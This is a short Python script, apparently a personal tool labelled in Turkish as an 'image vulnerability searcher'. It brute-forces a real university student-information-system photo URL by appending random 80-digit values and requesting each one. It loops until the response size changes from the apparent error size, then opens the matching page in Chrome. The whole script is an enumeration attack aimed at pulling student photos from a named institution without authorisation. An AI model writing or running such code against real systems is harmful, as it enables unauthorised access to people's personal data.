# -*- coding: utf-8 -*-
"""
Created on Tue Dec 29 00:51:45 2020

@author: BABA
"""

"""import requests
cekis=requests.get()
a=cekis.content
print (a)

print(cekis)"""

from mechanize import Browser
from bs4 import BeautifulSoup
import requests
import random
import webbrowser
import os
import subprocess
import webbrowser
import sys

l="8774513004633024431164348947174763800481437448545054301710450285042814844442112"
"""087742513004633024431164348947174763800481437448545054301710450285042814844442112"""


b="https://obs.ahievran.edu.tr/oibs/zfoto.aspx?gkm=0"

print("Resim Acıgı Arayıcı")

u=len(str(l))
k=""
knt=3882
dongu=0
dongu1=1

while knt==3882:
    k=""
   # print("sa")
    a=0
   # print("Kombinasyonlar Deneniyor ")
   # os.system( 'cls')
    for i in range(a,u,1): 
        l=random.randint(0,9)
      # 
        k=k+str(l)
        a=a+1
    print("","\n\n")
    url = (b+k)
    response=requests.get(url)
    z=len(response.content)
    knt=z
    dongu=dongu+1
    
    print(" "*44,"Kombinasyonlar Deneniyor ")
    dongu1=dongu1+1
    

    if dongu1==115:
        dongu1=0  
        
     
    print("="*dongu1) 
    print(" "*55,dongu)
    print("="*dongu1)
    os.system('cls')
    


print(url)
print("",end="\n")

"""webbrowser.open_new_tab(url)"""

chrome_path = '/usr/bin/google-chrome-stable %U '

webbrowser.get(chrome_path).open(url)


     

